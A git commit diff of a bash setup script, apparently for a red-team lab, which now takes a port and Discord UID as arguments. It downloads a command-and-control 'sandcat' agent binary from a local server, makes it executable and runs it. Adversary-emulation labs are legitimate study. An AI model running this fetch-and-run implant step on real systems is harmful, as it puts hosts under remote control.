400a8e08f67feadfdfe9dfd49c0273fbe4fa26cb
Vinh Tran <106710730+vtran0314@users.noreply.github.com>
2023-07-11 20:00:12 -0400

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,13 +1,21 @@
 #!/bin/bash
-PORT = ""
-DISCORD_UID = ""
 
-IFS=" " real -p "Input port and discord's uid: " PORT DISCORD_UID 
-    
-#set up sandcat-agent
+# Check if both arguments are provided
+if [[ $# -ne 2 ]]; then
+  echo "Usage: $0 <PORT> <DISCORD_UID>"
+  exit 1
+fi
+
+PORT=$1
+DISCORD_UID=$2
+
+echo "The port is: $PORT"
+echo "Discord_UID is: $DISCORD_UID"
+
+# Set up sandcat-agent
 echo "Setting up sandcat-agent"
-server="http://host.docker.internal:${PORT}"
+server="http://host.docker.internal:$PORT"
 
-curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > ${DISCORD_UID};
-chmod +x DICORD_UID;
-./DISCORD_UID -server $server -v
+curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > "$DISCORD_UID"
+chmod +x "$DISCORD_UID"
+./"$DISCORD_UID" -server "$server" -v
